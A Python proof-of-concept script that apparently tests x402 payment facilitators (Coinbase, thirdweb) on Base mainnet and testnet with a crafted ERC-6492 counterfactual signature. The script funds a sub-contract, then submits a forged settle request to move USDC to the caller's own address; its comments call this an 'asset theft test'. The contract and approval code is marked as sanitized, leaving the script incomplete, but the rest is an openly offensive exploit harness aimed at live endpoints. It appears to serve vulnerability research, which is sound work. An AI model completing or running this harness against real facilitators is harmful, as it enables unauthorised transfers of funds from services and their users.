from simplebase import *


def run(target_name=None):
    import os
    if target_name:
        os.environ["TARGET"] = target_name

    import argparse
    import os
    import secrets

    import config
    from target import current_target

    config.privatekey = config.pk1
    MYADDR = topub(config.pk1)

    # deployed-later signature wrapper (v2 payload)

    p = argparse.ArgumentParser(description="ERC-6492 settle/verify test (v2 payload)")
    p.add_argument("-t", "--target", help="target name from target.py (defaults to target.DEFAULT_TARGET)")
    args = p.parse_args()

    CHAIN_PRESETS = {
        "base": {
            "chainid": 8453,
            "usdc": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
            "usdc_name": "USD Coin",
            "usdc_version": "2",
            "endpoints": [
                "https://mainnet.base.org",
                "https://base.public.blockpi.network/v1/rpc/public",
                "https://base-rpc.publicnode.com",
            ],
            # set your own contract via CONTRACT env
            "contract": "",
        },
        "base-sepolia": {
            "chainid": 84532,
            "usdc": "0x036CbD53842c5426634e7929541eC2318f3dCF7e",
            "usdc_name": "USDC",
            "usdc_version": "2",
            "endpoints": [
                "https://base-sepolia.drpc.org",
                "https://sepolia.base.org",
                "https://base-sepolia-rpc.publicnode.com",
            ],
            # set your own contract via CONTRACT env 
            "contract": "",
        },
    }

    # Always resolve facilitator and amount from target.py (no raw URL input)
    tgt = current_target(args.target)
    chain_key = tgt.network
    if chain_key not in CHAIN_PRESETS:
        raise SystemExit(f"Unsupported network '{chain_key}' for 6492 test")
    chain_cfg = CHAIN_PRESETS[chain_key]
    AMT = tgt.pay_amount
    FACILITATOR = "coinbase" if tgt.name == "coinbase" else tgt.facilitator_base
    CHAINID = chain_cfg["chainid"]
    USDC = chain_cfg["usdc"]
    USDC_NAME = chain_cfg["usdc_name"]
    USDC_VERSION = chain_cfg["usdc_version"]
    CONTRACT = os.getenv("CONTRACT", chain_cfg["contract"])

    CAIP_NETWORK = f"eip155:{CHAINID}"

    p = Endpoint_Provider(chain_cfg["endpoints"])

    headers = {}
    if "thirdweb" in tgt.name:
        try:
            headers["x-secret-key"] = config.ThidWeb_Secret_key
        except Exception as exc:
            raise SystemExit("thirdweb target requires ThidWeb_Secret_key in config.py") from exc


    def _resolve_action_endpoint(action: str) -> tuple[str, dict]:
        if action not in {"verify", "settle"}:
            raise ValueError(f"Unsupported action '{action}'")
        url = FACILITATOR
        local_headers = dict(headers)
        if FACILITATOR == "coinbase":
            from config import CDP_API_KEY_ID, CDP_API_KEY_SECRET
            from cdp.x402 import create_facilitator_config
            import asyncio

            facilitator_config = create_facilitator_config(
                api_key_id=CDP_API_KEY_ID,
                api_key_secret=CDP_API_KEY_SECRET,
            )
            local_headers.update(asyncio.run(facilitator_config["create_headers"]())[action])
            url = facilitator_config["url"] + "/" + action
        else:
            if not url.endswith("/" + action):
                if not url.endswith("/"):
                    url += "/"
                url += action
        return url, local_headers


    def _build_v2_payload(payer_addr: str, payer_pk: str, pay_to: str, amount: int) -> dict:
        ts = int(time.time())
        valid_after = ts - 60
        valid_before = ts + 60
        nonce_bytes = secrets.token_bytes(32)
        typed_data = {
            "types": {
                "TransferWithAuthorization": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "value", "type": "uint256"},
                    {"name": "validAfter", "type": "uint256"},
                    {"name": "validBefore", "type": "uint256"},
                    {"name": "nonce", "type": "bytes32"},
                ]
            },
            "primaryType": "TransferWithAuthorization",
            "domain": {
                "name": USDC_NAME,
                "version": USDC_VERSION,
                "chainId": CHAINID,
                "verifyingContract": USDC,
            },
            "message": {
                "from": payer_addr,
                "to": pay_to,
                "value": amount,
                "validAfter": valid_after,
                "validBefore": valid_before,
                "nonce": nonce_bytes,
            },
        }
        sig = sign_eip712(typed_data, payer_pk)

        requirements = {
            "scheme": "exact",
            "network": CAIP_NETWORK,
            "asset": USDC,
            "amount": str(amount),
            "payTo": pay_to,
            "maxTimeoutSeconds": 60,
            "extra": {
                "name": USDC_NAME,
                "version": USDC_VERSION,
            },
        }

        payload = {
            "x402Version": 2,
            "resource": {
                "url": tgt.needpay_url,
                "description": "",
                "mimeType": "",
            },
            "accepted": requirements,
            "payload": {
                "authorization": {
                    "from": payer_addr,
                    "to": pay_to,
                    "value": str(amount),
                    "validAfter": str(valid_after),
                    "validBefore": str(valid_before),
                    "nonce": b16e(nonce_bytes),
                },
                "signature": sig,
            },
        }

        return {
            "x402Version": 2,
            "paymentPayload": payload,
            "paymentRequirements": requirements,
        }

    print("FACILITATOR:", FACILITATOR)
    print("AMT:", AMT)
    print("NETWORK:", CAIP_NETWORK)

    print("my usdc bal:", p.callfunction(USDC, "balanceOf(address)", toarg(MYADDR)) / 1e6)


    if "SALT" in os.environ:
        salt = bd(os.environ["SALT"])
    else:
        salt = secrets.token_bytes(32)


    print(f"SALT={b16e(salt)}")
    sub = p.batch_callfunction_decode([[CONTRACT, "createSub(bytes32,uint256)", ec(["bytes32", "uint"], [salt, 0])]], ["address"])[0]
    print("sub:", sub)

    contractbal = p.erc20_balanceOf(USDC, sub)
    print("contract bal:", contractbal / 1e6)
    needed = max(0, AMT - contractbal)
    if needed > 0:
        print(f"funding sub with {needed / 1e6} USDC")
        fund_data = _build_v2_payload(MYADDR, config.pk1, sub, needed)
        fund_url, fund_headers = _resolve_action_endpoint("settle")
        x = sess.post(fund_url, json=fund_data, headers=fund_headers)
        print(x, x.text)
    else:
        print("sub has enough balance, skip funding")



    # ERC-6492 contract deployment test
    ############### Create Sub-contract Code Start#################################
    # sanitized
    ############### Create Sub-contract Code End#################################

    # ERC-6492 asset theft test
    ############### Create Transfer Aprovement Code Start#################################
    # sanitized
    ############### Create Transfer Aprovement Code End#################################

    ## Generate Signature
    sig = "0x" + ec(["address", "bytes", "bytes"], [CONTRACT, bd(cd), bd("11" * 131)]) + "6492649264926492649264926492649264926492649264926492649264926492"

    print("sig:")
    print(sig)


    def _build_v2_request(action: str):
        assert action in {"verify", "settle"}
        ts = int(time.time())
        valid_after = ts - 60
        valid_before = ts + 60
        nonce_bytes = secrets.token_bytes(32)

        requirements = {
            "scheme": "exact",
            "network": CAIP_NETWORK,
            "asset": USDC,
            "amount": str(AMT),
            "payTo": MYADDR,
            "maxTimeoutSeconds": 60,
            "extra": {
                "name": USDC_NAME,
                "version": USDC_VERSION,
            },
        }

        payload = {
            "x402Version": 2,
            "resource": {
                "url": tgt.needpay_url,
                "description": "",
                "mimeType": "",
            },
            "accepted": requirements,
            "payload": {
                "authorization": {
                    "from": sub,
                    "to": MYADDR,
                    "value": str(AMT),
                    "validAfter": str(valid_after),
                    "validBefore": str(valid_before),
                    "nonce": b16e(nonce_bytes),
                },
                "signature": sig,
            },
        }

        data = {
            "x402Version": 2,
            "paymentPayload": payload,
            "paymentRequirements": requirements,
        }

        url = FACILITATOR
        if not url.endswith("/" + action):
            if not url.endswith("/"):
                url += "/"
            url += action

        if FACILITATOR == "coinbase":
            from config import CDP_API_KEY_ID, CDP_API_KEY_SECRET
            from cdp.x402 import create_facilitator_config
            import asyncio

            facilitator_config = create_facilitator_config(
                api_key_id=CDP_API_KEY_ID,
                api_key_secret=CDP_API_KEY_SECRET,
            )
            headers.update(asyncio.run(facilitator_config["create_headers"]())[action])
            url = facilitator_config["url"] + "/" + action

        return url, data


    # verify_url, verify_data = _build_v2_request("verify")
    # print("verify url:", verify_url)
    # x = sess.post(verify_url, json=verify_data, headers=headers)
    # print("verify result:", x, x.text)

    settle_url, settle_data = _build_v2_request("settle")
    print("settle date:", settle_data)
    print("settle url:", settle_url)
    x = sess.post(settle_url, json=settle_data, headers=headers)
    print("settle result:", x, x.text)

def main():
    run()


if __name__ == "__main__":
    main()
